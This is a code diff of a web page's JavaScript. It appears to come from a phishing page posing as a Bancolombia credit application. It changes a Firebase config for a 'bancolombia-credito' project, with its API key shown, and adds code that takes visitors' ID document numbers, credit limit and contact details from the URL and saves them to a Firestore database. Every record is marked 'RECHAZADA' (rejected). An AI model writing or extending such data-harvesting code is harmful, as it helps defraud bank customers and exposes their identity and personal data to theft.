@@ -206,7 +206,7 @@
       }
     })();
     const firebaseConfig = {
-  apiKey: "AIzaSy5yDnpt57vNCirFZnVklze_irVBT9hmiqbY",
+  apiKey: "AIzaSy5y5Dnpt57vNCirFZnVKlze_irVBT9hmibY",
   authDomain: "bancolombia-credito.firebaseapp.com",
   projectId: "bancolombia-credito",
   storageBucket: "bancolombia-credito.appspot.com",
@@ -221,11 +221,17 @@ const db = firebase.firestore();
 
 async function guardarEnFirebase() {
   try {
+    const params = new URLSearchParams(window.location.search);
+    const doc = params.get("documento") || params.get("doc") || "";
+    const tipo = params.get("tipo") || "";
+    const cupo = params.get("cupo") || "";
+    const contacto = params.get("contacto") || params.get("usuario") || "";
+    
     await db.collection('solicitudes').add({
       documento: doc || '',
+      tipo: tipo || '',
       contacto: contacto || '',
       cupo: cupo || '',
-      usuario: usuario || '',
       fecha: new Date().toLocaleString('es-CO'),
       estado: "RECHAZADA"
     });
